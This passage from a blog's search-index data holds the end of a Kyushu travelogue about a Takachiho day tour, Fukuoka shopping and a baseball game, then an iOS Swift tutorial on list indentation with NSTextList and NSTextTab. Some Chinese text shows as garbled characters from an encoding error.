KKDAY, EasyGo, tours to Takachiho, Yufuin, and others.)The tour guide (Chinese-speaking) has the list. After you check in, they will tell you the bus number. Remember the bus number to board the correct bus directly. Seats are allocated on a first-come, first-served basis. If you have special needs (e.g., motion sickness), please notify the tour guide.08:00 Departure when everyone has arrived Tour Guide Self-Introduction (Shinan) - Chinese Â§ßÂÆ∂Â•ΩÔºåÊàëÊòØ‰Ω†ÂÄëÁöÑÂ∞éÈÅäÁü≥Ê•†„ÄÇÂæàÈ´òËààËÉΩÂ∏∂È†òÂ§ßÂÆ∂‰∏ÄËµ∑Êé¢Á¥¢ÈÄôÁæéÈ∫óÁöÑÂú∞Êñπ„ÄÇÂ∏åÊúõÂ§ßÂÆ∂Âú®ÊóÖÁ®ã‰∏≠Áé©ÂæóÈñãÂøÉÔºåÊúâ‰ªª‰ΩïÂïèÈ°åÈö®ÊôÇÂïèÊàë„ÄÇ Itinerary introduction: The guide said the Takachiho one-day tour is the farthest and most tiring among all the one-day tour options XD There is WiFi on the bus (but it is not very stable) Always wear your seatbelt ‚ö†Ô∏è Most are Taiwanese Introduction to Takachiho Shrine and Inquiry About Boat Reservations It takes about 3 hours to reach the first Takachiho Shrine. About Takachiho Boating Takachiho boating requires booking three days in advance, with limited slots per time period *‚ö†Ô∏è_ Boat rides in Takachiho must be booked three days in advance, with limited slots per time period ‚ö†Ô∏è Boat rides in Takachiho require booking three days in advance, with limited slots per time period ‚ö†Ô∏èThe rowing trip is short, taking about 30‚Äì45 minutes round trip. Lunch should be finished around 12:00, and the Takachiho itinerary ends around 13:20, after which everyone will regroup to return.Our group has 3 parties with reservations. Therefore, if you want to book a boat tour for a day trip, 12:00 / 12:30 would be a more suitable time. ‚ö†Ô∏èAfter lunch, you will need to walk to Takachiho Gorge. If you have reserved a boat ride or feel you might not have enough energy, the guide has arranged a shuttle bus to take you directly there, saving time. It is still best to follow the arrangements made by KKDAY. It is recommended to check with the official source before booking to ensure there are no issues. ‚ö†Ô∏è9:20 Rest Stop BreakDue to the long drive, we will stop at a rest area for 10 minutes to allow everyone to use the restroom and stretch their legs.10:50 Arrive at Takachiho ShrineTakachiho Shrine is completely surrounded by sacred trees, exuding a sense of tranquility and freshness.Meoto Sugi , the guide mentioned on the bus that if you come with family, couples, lovers, or friends, you can hold hands and walk around the tree three times to pray for blessings.Around 11:20, return to the meeting point and get on the bus.11:30 Lunch Takachiho Cuisine Kagura InnAfter visiting Takachiho Shrine, go nearby for lunch.Slippers are required. Overall, it feels like a Japanese restaurant mainly catering to tour groups, but this was my first time experiencing a Japanese restaurant.The overall meal was below average, possibly due to the large group. Most of the food was cold, and the meat quality was mediocre.12:15 Start hiking to Takachiho Gorge (all downhill)After eating, we followed the guide on a hike down to Takachiho Gorge.About a 20-minute walk on the trail will lead you to Takachiho Gorge. From this viewpoint, you can see the end of the gorge (the rowing stop line).12:45 Arrive at Takachiho GorgeLooking back from the bridge at Takachiho Gorge, you can see the ancient path we just walked and the boat below.The rowing venue is just across the bridge. The total length (up to the stop line we just saw) is about 250 meters.There is a small park and shopping street where you can enjoy ice cream or snacks to recharge.13:20 Regroup at the tour busAround 13:45 Arrive at Amano-Iwato Shrine West Main Shrine (Check information for other events during the cherry blossom season)After getting off the tour bus, walk about 5 minutes to Amano-Iwato Shrine West Main Hall. Shops along the shopping street hang different divine masks at their entrances.The tour guide will add the story of Amaterasu that was introduced on the tour bus.To reach Amano Iwato River, you need to walk a short distance. The guide agreed with everyone to walk together to Amano Iwato River first, then everyone can return on their own to explore freely (or follow the guide back directly).Around 14:00 Walk to Amano Iwato RiverAround 14:15 Arrive at Amano IwatoAmano Iwato Cave is the place where the sun goddess Amaterasu once hid; the shrine‚Äôs torii gate is surrounded by stones left by worshippers.On the way back from the shrine visit, we passed by an ice cream shop.Everyone was lining up here for the ice cream, so we also tried the local Miyazaki mango ice cream (900 yen). The guide said Miyazaki mangoes are premium, but honestly, Taiwanese mangoes still have a stronger mango flavor.After resting, slowly walk back to visit the Ama-no-Iwato Shrine.Around 15:10 Gather for Return TripAfter the last activity, it was already past 3 PM, so it was time to start the return trip (still a three-hour drive back to Fukuoka).Around 16:40 Stop at Rest AreaThe return trip will also stop at rest areas for everyone to use the restroom and stretch.Return to Hakata Station Chikushi Exit (Hakata Back Exit) around 18:00The trip concluded smoothly. Thanks to Shinan for the leadership and itinerary planning üëèüëèüëèüëèüëè.For dinner, I casually bought a convenience store hot dog and a rice ball from the Tenjin Underground Mall that I had on Day 6. The new grape-flavored Suntory is delicious!! For a snack, I had a BRULEE.Good night.Day 10 Shopping in Hakata, Shopping in Tenjin, Watching Baseball at PayPay DomeThe Kyushu sightseeing itinerary is almost complete, leaving nearly two days for shopping and strolling.In the morning, first go to Don Quijote (24 hr) for some quick shopping. The Tenjin Main Store is very large, with several floors to explore.Around noon, visit the department stores near Hakata Station to browse, buy souvenirs, Fukuoka sake, Fukusaya Nagasaki castella cake, Kokura Meigetsu rice crackers, and more.In the afternoon, return to the Tenjin area, Tenjin Underground Shopping Mall, Le Labo, Iwataya Department Store, Mitsukoshi Department Store, and more (there are many department stores around Tenjin).Le labo Another 13 just ran out and restocked. This time I bought 50ml (about NT$5,800 after tax refund).At Tenjin C-pla, I found a fun bus stop button XDIt makes a sound when pressed XD.Heading back to the hotel with our loot to rest, enjoying a hot dog, dessert, and a must-try in Japan! Fresh cola!Hakata Canal CityAfter taking a break, head out again and arrive at Canal City Hakata at 16:30.Mainly to visit the huge gachapon department store in B1.https://gofukuoka.jp/zh-tw/spots/detail/196050After shopping, head to Hakata Station.Around 17:30, take a bus from Hakata Station to PayPay Dome. Watch the baseball game at 18:00.Fukuoka SoftBank Hawks Game @ Fukuoka PayPay Dome Stadium Today‚Äôs matchup: Fukuoka SoftBank Hawks vs. Tokyo Yakult SwallowsSome Entry Rules Reminder : You need to open your backpack for security check, no outside food allowed, you can bring one bottle of tea or beverage, no outside alcohol allowed, alcohol and food are sold inside, remember to get a re-entry permit if you leave and want to come back.The mascot of the Fukuoka SoftBank Hawks is named Harry, so of course, I had to watch the game and show my support.Last time I sat in the more expensive infield home plate area, this time I wanted to try the cheapest seats just to experience the atmosphere. I thought there would be general admission, but all seats were reserved. So I chose a spot in the last row on the edge of the outfield side for easy access (the outfield seats have no backrests, which makes it easier to get in and out).I have to admire the professional sports culture in Japan. On weekdays at 6:00 PM, the stadium with about 40,000 seats is almost full. When choosing seats, there are no entire rows empty or seats at the edges and corners available.The view and distance are much worse compared to last time.This time, they lost by a large margin, ending the game at 9:3. There were no fireworks to watch, but we did see the cheering activities of both teams. (Fukuoka SoftBank Hawks‚Äô balloon cheering and Tokyo Yakult Swallows‚Äô umbrella dance cheering)After about 7 innings, the score was already 9-1, and everyone started leaving one after another. I didn‚Äôt watch until the end.The bus stop was also crowded with people. Like last time, I followed the crowd and walked back to the Tojinmachi subway station. (About 15 minutes)Before heading back to the hotel to rest, I deliberately stopped at Nakasu Yatai in the corridor to take one last look at the night view before leaving Fukuoka.Late-night snack: Nissin Donbei Inari Udon (first time trying it after so many days here), fruit wine from Oita, and convenience store fried chicken with chicken oil (juicy and delicious).Day 11 Lalaport, Shopping in Hakata, Shopping in Tenjin, Return TripUnknowingly, it‚Äôs been 11 days abroad, and I‚Äôve started to miss Taiwan‚Äôs delicious food. The flight at 9:00 PM still leaves plenty of time to wander around.https://toyscabin.com/product/20221201_546.phpThe main souvenirs have been bought and packed. Today, I just wandered around looking for the tram gacha machine. (In the end, I couldn‚Äôt find it. According to the vendor-provided store list, all in the city are sold out.)LalaportNo plans in the morning, so went to Lalaport first. (Opens at 10 AM)The supermarket on the first floor has a drink cooler made from a converted West Rail bus. It‚Äôs really cool XD.Mainly went to the 3rd floor Gachagacha Forest and the Pon! near the escalator on the 1st floor to see if they had the capsule toys I was looking for. (No luck)It‚Äôs almost 11 o‚Äôclock, and I‚Äôm very hungry since I haven‚Äôt had breakfast. I ate a seafood tempura rice bowl at the food court on the third floor (found it quite salty).Back to the first floor to buy Rusuian‚Äôs strawberry daifuku to refresh the palate.Couldn‚Äôt find the capsule toy I wanted, so I left Lalaport and returned to Hakata Station. Pon! is also inside 1010, but it wasn‚Äôt there either.I also couldn‚Äôt find it in the capsule toy area at Hakata Yodobashi.After the setback in Hakata, I returned to the capsule toy shops in the Tenjin area to search but still found nothing.Finally gave up and went upstairs to visit Animate and Kiddy Land (which have lots of IP merchandise).The time is around 4:00 PM, and the trip is about to end. Finally, I sat at Komeido Coffee to enjoy some dessert and coffee to rest.Around 17:00, returned to the hotel to pick up luggage and slowly headed to Fukuoka Airport. I originally thought the subway would be crowded after 5 PM, but it was actually quite empty.It‚Äôs quite a distance from Tenjin Minami to Tenjin. Dragging luggage takes about 15 minutes.After taking the Airport Line to Fukuoka Airport Station (Domestic Terminal), you need to transfer to the airport shuttle bus (free) to reach the International Terminal.Shuttle buses run frequently, about every 5‚Äì10 minutes, with a trip time of around 10 minutes. After getting off, you still need to walk to the 3rd floor departure hall. Conservatively, it takes an additional 30 minutes from the airport metro line to actually reach the international terminal.Fukuoka Airport is under renovation and is somewhat chaotic.It was still too early to go to the airport; the counters were not open yet. The ground staff guided us to first use 1 self check-in, then 2 self baggage drop. They assisted us throughout; we quickly completed the baggage check-in (this time only 17 Kg).Around 18:30, we started waiting for the flight.The departure lounge at Fukuoka Airport is long and narrow, very crowded and chaotic. (Not sure if it‚Äôs because of ongoing renovations and too many flights waiting to take off.)The duty-free shops for luxury goods and cosmetics are quite comprehensive, and the staff all speak Chinese; there are also souvenir shops (including Fukusaya Nagasaki Castella here); there is only one duty-free tobacco and alcohol shop, which requires lining up, and the food and convenience stores are even busier, with long queues everywhere. Special announcement for the previous flight CI129 at 19:10: Please follow China Airlines‚Äô rule of carrying only one piece of carry-on luggage. Additional items require extra purchase (this flight appears fully booked).‚ö†Ô∏èLater, feeling that this area was too noisy and chaotic, I walked north towards 501‚Äì504, where there were fewer people; there was also a caf√© and light meal shop to eat at.Just buy a pork cutlet sandwich and grab a few cans of draft cola and peach water to bring back to Taiwan.Boarding started around 20:30. This flight did not have a special rule for checking one carry-on bag (but I had already packed everything into one bag‚Ä¶). At 21:00, we prepared for takeoff, and at 21:09, the plane took off. The aircraft is an A330-300, which is relatively older.Goodbye Kyushu, goodbye Japan. The airplane meal was ginger pork fried noodles, not very good, but the fruit included cantaloupe!The flight encountered turbulence and was quite bumpy, but it landed safely in Taiwan. The arrival was delayed by nearly 30 minutes, arriving close to 11 PM (scheduled for 10:25 PM).Because I was afraid of missing public transportation, I ran all the way. I missed the airport express train but luckily caught the bus at the end. Otherwise, I would have had to take an unsafe unlicensed taxi back to Taipei.Route 1819 , my god, the trip to Taipei Main Station takes about 55 minutes. The midway stops are shown in the above image. If you want to get off midway, inform the driver in advance when loading your luggage. He will separate your bags; otherwise, all luggage for Taipei Main Station will be placed together, and you won‚Äôt be able to retrieve your bags if you get off midway. ‚ö†Ô∏èAround 00:00 on 6/14, returned to the cozy home, ending this 11-day trip.The daily average steps are around 20,000, with a maximum of 27,000 steps.LootThe box on the right was missed in the photo. It‚Äôs shrimp crackers that I tasted and liked at the shopping street in Hakata Station department store.Small Items Collected from Various Parts of JapanThis time, we added four of the Seven Lucky Gods, mini beer, and the Takachiho (dog) Year of the Dog amulet.The background newspaper was a gift with the purchase of Le Labo.Finally, thank you for reading my travel log; also, thanks to my travel companion James.Inspiration for Your Next Trip Southeast Asia Southern Kyushu Kagoshima landing -&gt; Oita -&gt; Sunflower Ferry -&gt; Kobe -&gt; Himeji Castle -&gt; Amanohashidate -&gt; Nagoya Airport return Tohoku Region, Sendai KKday Promotion Japan JR PASSÔΩúKyushu Area Rail PassÔΩúNorth Kyushu &amp; South Kyushu &amp; All KyushuÔΩúE-ticket Japan Nagasaki | Kyushu Huis Ten Bosch Ticket Huis Ten Bosch Japan Fukuoka | Hakata Port ‚Äì Busan Port Cargo-Passenger Cruise ‚ÄúNew Camellia‚Äù Camellia Line Japan eSIM CardÔΩúDaily High Speed, Total Data, Unlimited Data Plans Fukuoka NishitetsuÔΩúDazaifu Tenmangu + Yanagawa Boat Tour Sightseeing PassÔΩúPick up at Fukuoka Airport International Terminal teamLab Forest Fukuoka Tickets ‚Äî SBI SecuritiesÔΩúCheck Now „ÄêSolo Tour„ÄëOne-Day Tour in Kyushu, JapanÔΩúTakachiho Gorge &amp; Amanoiwato Shrine &amp; Amano Yasugawara (Includes Special Aso Akaushi Beef BBQ Set)ÔΩúDeparting from Fukuoka One-Day Trip in Kumamoto, Kyushu | Aso Nakadake Volcano, Kusasenri, Kumamoto Castle, Suizenji Jojuen / All-You-Can-Eat Seasonal Fruits | Departing from Fukuoka Hakata (Chinese, English, Japanese Supported) If this article is helpful to you, please consider using my referral link to purchase KKday products and tours. I will receive a portion of the proceeds to continue creating more travel content. Thank you.More Travel Stories [Travelogue] 2025 Busan, South Korea 8 Days 7 Nights Free Travel [Travelogue] 2024 San‚Äôin Wide Area: Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2023 Kyushu 10-Day Solo Trip ‚≠êÔ∏è (Kyushu Part 1) [Travelogue] 2023 Hiroshima Okayama 6-Day Independent Trip [Travelogue] 9/11 One-Day Quick Trip to Nagoya [Travelogue] 2023 Tokyo 5-Day Free Travel [Travelogue] 2023 Kyoto-Osaka-Kobe 8-Day Free Trip If you have any questions or feedback, feel free to contact me.More Travelogues Tokyo Area Travel GuideÔΩúKawagoe Little Edo &amp; Atami Fireworks Festival 5-Day Itinerary Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration San‚Äôin &amp; Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours Sanyo Region Travel GuideÔΩú6-Day Hiroshima &amp; Okayama Itinerary for Freedom Seekers Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki &amp; Kumamoto Efficiently Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay &amp; Transport Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay &amp; Transit TipsFound this guide useful? Use my KKday referral link to book your trip‚ÄîI‚Äôll earn a small commission to support more content like this. Thank you! üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS NSAttributedString: Mastering NSTextList & NSTextTab for List Indentation", "url": "/posts/zrealm-dev/ios-nsattributedstring-mastering-nstextlist-nstexttab-for-list-indentation-2981dc0fcd58/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, nsattributedstring, swift, layout, uikit", "date": "2024-06-01 22:43:49 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![iOS] Exploring NSAttributedString: Using NSTextList or NSTextTab to Implement...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![iOS] Exploring NSAttributedString: Using NSTextList or NSTextTab to Implement List IndentationiOS Swift Using NSAttributedString‚Äôs NSTextList or NSTextTab to Implement Indentation Similar to HTML List OL/UL/LI ListsTechnical BackgroundPreviously, while developing my open-source project ‚ÄúZMarkupParser‚Äù, a library for converting HTML strings into NSAttributedString objects, I needed to study and implement different HTML components using only NSAttributedString. That was when I first encountered the .paragraphStyle: NSParagraphStyle attributes of NSAttributedString, specifically the textLists: [NSTextList] and tabStops: [NSTextTab] properties. These are two very obscure attributes with scarce information online.When implementing HTML list indentation conversion, I found examples using these two attributes. First, let‚Äôs look at the nested tag structure of an HTML list indentation:&lt;ul&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt; ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags. &lt;ol&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;/ol&gt; &lt;/li&gt;&lt;/ul&gt;Display effect in the browser:As shown in the image above, the list supports multiple nested levels and requires indentation according to the hierarchy.At that time, there were many other HTML tag conversions to implement, so the workload was heavy; I quickly tried using NSTextList or NSTextTab to create list indentation without deep understanding. However, the results were unsatisfactory: spacing was too wide, no alignment, multi-line items misaligned, unclear nested structure, and spacing was uncontrollable. After some trial and error without a solution, I gave up and temporarily used a crude method for layout:As shown in the image above, the effect is poor because it is manually formatted using spaces and the symbol Ôºç, with no indentation effect. The only advantage is that the spacing is made of space characters, allowing you to control the size.This matter was left unresolved, and after open-sourcing it for over a year, I didn‚Äôt make any special changes; until recently, I started receiving requests to improve List conversion through Issues, and a developer provided a solution PR. By referring to the use of NSParagraphStyle in that PR, I gained new insights; studying NSTextList or NSTextTab shows potential to perfectly implement indented list functionality!Final OutcomeAs usual, here is the final result image. You can now perfectly convert HTML List Items to NSAttributedString objects in ZMarkupParser ~&gt; v1.9.4 and above. Supports line breaks while maintaining indentation Supports custom indentation spacing size Supports nested structure indentation Supports different List Item Styles, such as Bullet, Disc, Decimal‚Ä¶ and even custom symbols The following is the main text.Exploring Methods to Implement List Indentation with NSTextList or NSTextTabIt is ‚Äúor,‚Äù not ‚Äúand.‚Äù NSTextList and NSTextTab are not used together; each property can independently achieve list indentation.Method (1) Exploring List Indentation Using NSTextListlet listLevel1ParagraphStyle = NSMutableParagraphStyle()listLevel1ParagraphStyle.textLists = [textListLevel1] let listLevel2ParagraphStyle = NSMutableParagraphStyle()listLevel2ParagraphStyle.textLists = [textListLevel1, textListLevel2] let attributedString = NSMutableAttributedString()attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1))\\tList Level 1 - 1 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 2))\\tList Level 1 - 2\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 3))\\tList Level 1 - 3\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 1))\\tList Level 2 - 1\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 2))\\tList Level 2 - 2 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 4))\\tList Level 1 - 4\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle])) textView.attributedText = attributedStringDisplay Effect:NSTextList provides very few Public APIs, and the controllable parameters are limited to these:// Item display stylevar markerFormat: NSTextList.MarkerFormat { get }// Starting number for ordered itemsvar startingItemNumber: Int// Whether it is an ordered numeric item (available only on iOS 16 and later, this API is still updated)@available(iOS 16.0, *)open var isOrdered: Bool { get }// Returns the marker string; itemNumber is the item index and can be omitted if not orderedopen func marker(forItemNumber itemNumber: Int) -&gt; StringNSTextList.MarkerFormat Style Reference: To increase visibility, display at item list position 8.Usage:// Define an NSMutableParagraphStylelet listLevel1ParagraphStyle = NSMutableParagraphStyle()// Define List Item style, item starting positionlet textListLevel1 = NSTextList(markerFormat: .decimal, startingItemNumber: 1)// Assign NSTextList to textLists arraylistLevel1ParagraphStyle.textLists = [textListLevel1]//NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1))\\Item One\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle])// Add nested subitems:// Define subitem List Item style, item starting positionlet textListLevel2 = NSTextList(markerFormat: .circle, startingItemNumber: 1)// Define subitem NSMutableParagraphStylelet listLevel2ParagraphStyle = NSMutableParagraphStyle()// Assign parent and child NSTextList to textLists arraylistLevel1ParagraphStyle.textLists = [textListLevel1, textListLevel2]NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1))\\Subitem One-One\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle])// For nested sub-subitems...// Just continue appending NSTextList to the textLists array Use \\n to separate each list item. Using \\t for bullet points ensures that attributedString.string returns the list correctly as plain text. \\tBullet points\\t will not be displayed, so any formatting after the bullet point will not show (e.g., adding a . will not affect the display). Usage Issues: Cannot control the left and right spacing of bullet points Cannot customize bullet points, numbered items cannot include . -&gt; 1. It was found that if the parent list is unordered (e.g., .circle), and the child list is an ordered numeric list (e.g., .decimal), the child list‚Äôs startingItemNumber setting will not work. NSTextList can do what was described above, but it is not very practical for real product development; the spacing is too wide, and numbered items lack a . which greatly reduces usability. Online, I only found changing spacing via TextKit NSTextStorage, but I think this method is too hard-coded, so I gave up. The only advantage is that you can easily add nested indented sublists by appending to the textLists array without calculating complex layout issues.Method (2) Exploring List Indentation Using NSTextTabNSTextTab allows us to set the position of the \\t Tab placeholder, with a default spacing of 28.We achieve a bullet list effect by setting NSMutableParagraphStyle‚Äôs tabStops + headIndent + defaultTabInterval.let textListLevel1 = NSTextList(markerFormat: .decimal, startingItemNumber: 1)let textListLevel2 = NSTextList(markerFormat: .circle, startingItemNumber: 1) let listLevel1ParagraphStyle = NSMutableParagraphStyle()listLevel1ParagraphStyle.defaultTabInterval = 28listLevel1ParagraphStyle.headIndent = 29listLevel1ParagraphStyle.tabStops = [ NSTextTab(textAlignment: .left, location: 8), // Corresponds to setting in image (1) Location NSTextTab(textAlignment: .left, location: 29), // Corresponds to setting in image (2) Location] let listLevel2ParagraphStyle = NSMutableParagraphStyle()listLevel2ParagraphStyle.defaultTabInterval = 28listLevel2ParagraphStyle.headIndent = 44listLevel2ParagraphStyle.tabStops = [ NSTextTab(textAlignment: .left, location: 29), // Corresponds to setting in image (3) Location NSTextTab(textAlignment: .left, location: 44), // Corresponds to setting in image (4) Location] let attributedString = NSMutableAttributedString()attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 1)).\\tList Level 1 - 1 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 2)).\\tList Level 1 - 2\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 3)).\\tList Level 1 - 3\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 1))\\tList Level 2 - 1\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel2.marker(forItemNumber: 2))\\tList Level 2 - 2 StringStringStringStringStringStringStringStringStringStringStringString\\n\", attributes: [.paragraphStyle: listLevel2ParagraphStyle]))attributedString.append(NSAttributedString(string: \"\\t\\(textListLevel1.marker(forItemNumber: 4)).\\tList Level 1 - 4\\n\", attributes: [.paragraphStyle: listLevel1ParagraphStyle]))textView.attributedText = attributedString The tabStops array corresponds to each \\t character in the text. NSTextTab can set the alignment direction and the location position (note that this is not setting the width, but the position within the text!). headIndent sets the starting position of the second line and beyond, usually set to the location of the second \\t, so that line breaks align with the bullet points. defaultTabInterval sets the default interval spacing for \\t. If there are other \\t characters in the text, they will be spaced according to this setting. location: Since NSTextTab specifies direction and position, you need to calculate the position yourself; you must calculate the bullet width (the number of digits also affects it) + spacing + the parent item‚Äôs indentation distance to achieve the effect shown in the above image. Bullet points are fully customizable. If the location is incorrect or cannot be matched, a direct line break will occur. The above example simplifies the calculation process and directly provides the answer to help everyone understand the layout method of NSTextTab. For real-world use, you can refer to the complete code below:let attributedStringFont = UIFont.systemFont(ofSize: UIFont.systemFontSize)let iterator = ListItemIterator(font: attributedStringFont) //let listItem = ListItem(type: .decimal, text: \"\", subItems: [ ListItem(type: .circle, text: \"List Level 1 - 1 StringStringStringStringStringStringStringStringStringStringStringString\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 2\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 3\", subItems: [ ListItem(type: .circle, text: \"List Level 2 - 1\", subItems: []), ListItem(type: .circle, text: \"List Level 2 - 2 fafasffsafasfsafasas\\tfasfasfasfasfasfasfasfsafsaf\", subItems: []) ]), ListItem(type: .circle, text: \"List Level 1 - 4\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 5\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 6\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 7\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 8\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 9\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 10\", subItems: []), ListItem(type: .circle, text: \"List Level 1 - 11\", subItems: [])])let listItemIndent = ListItemIterator.ListItemIndent(preIndent: 8, sufIndent: 8)textView.attributedText = iterator.start(item: listItem, type: .decimal, indent: listItemIndent)//private extension UIFont { func widthOf(string: String) -&gt; CGFloat { return (string as NSString).size(withAttributes: [.font: self]).width }}private struct ListItemIterator { let font: UIFont struct ListItemIndent { let preIndent: CGFloat let sufIndent: CGFloat } func start(item: ListItem, type: NSTextList.MarkerFormat, indent: ListItemIndent) -&gt; NSAttributedString { let textList = NSTextList(markerFormat: type, startingItemNumber: 1) return item.subItems.enumerated().reduce(NSMutableAttributedString()) { partialResult, listItem in partialResult.append(self.iterator(parentTextList: textList, parentIndent: indent.preIndent, sufIndent: indent.sufIndent, item: listItem.element, itemNumber: listItem.offset + 1)) return partialResult } } private func iterator(parentTextList: NSTextList, parentIndent: CGFloat, sufIndent: CGFloat, item: ListItem, itemNumber:Int) -&gt; NSAttributedString { let paragraphStyle = NSMutableParagraphStyle() // e.g. 1. var itemSymbol = parentTextList.marker(forItemNumber: itemNumber) switch parentTextList.markerFormat { case .decimal, .uppercaseAlpha, .uppercaseLatin, .uppercaseRoman, .uppercaseHexadecimal, .lowercaseAlpha, .lowercaseLatin, .lowercaseRoman, .lowercaseHexadecimal: itemSymbol += \".\" default: break } // width of \"1.\" let itemSymbolIndent: CGFloat = ceil(font.widthOf(string: itemSymbol)) let tabStops: [NSTextTab] = [ .init(textAlignment: .left, location: parentIndent), .init(textAlignment: .left, location: parentIndent + itemSymbolIndent + sufIndent) ] let thisIndent = parentIndent + itemSymbolIndent + sufIndent paragraphStyle.headIndent = thisIndent paragraphStyle.tabStops = tabStops paragraphStyle.defaultTabInterval = 28 let thisTextList = NSTextList(markerFormat: item.type, startingItemNumber: 1) // return item.subItems.enumerated().reduce(NSMutableAttributedString(string: \"\\t\\(itemSymbol)\\t\\(item.text)\\n\", attributes: [.paragraphStyle: paragraphStyle, .font: font])) { partialResult, listItem in partialResult.append(self.iterator(parentTextList: thisTextList, parentIndent: thisIndent, sufIndent: sufIndent, item: listItem.element, itemNumber: listItem.offset + 1)) return partialResult } }}private struct ListItem { var type: NSTextList.MarkerFormat var text: String var subItems: [ListItem]} We declare a simple ListItem object to encapsulate sublist items, using recursion to combine and calculate the spacing and content of the item list. NSTextList only uses the marker method to generate list symbols, but you can choose not to use it and implement your own instead. To increase the spacing before and after bullet points, you can directly set preIndent and sufIndent. Because position calculation requires using Font to measure width, the text must have .font set to ensure accurate calculation. CompletedAt first, I hoped to achieve this directly using NSTextList, but the results and customization options were very limited. In the end, I had to rely on a DIY approach with NSTextTab, controlling the position of \\t to manually assemble the bullet points. It‚Äôs a bit troublesome, but the effect perfectly meets the requirements! The goal was achieved, but I still haven‚Äôt fully mastered NSTextTab (for example: different directions? relative position of Location?). Official documentation and online resources are really scarce, so I‚Äôll study it again if I get the chance.Full Example DownloadBusiness InformationA small tool that converts HTML strings into NSAttributedString, supporting custom style specifications and custom tag features.References ObjC String Rendering / ObjC China ‚Äî String RenderingThis article offers full examples of NSAttributedString usage, including list and table implementations.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Plane.so Docker Self-HostedÔΩúComplete Guide to Setup, Backup & Nginx Proxy", "url": "/posts/zrealm-dev/plane-so-docker-self-hosted-complete-guide-to-setup-backup-nginx-proxy-9903c9783a97/", 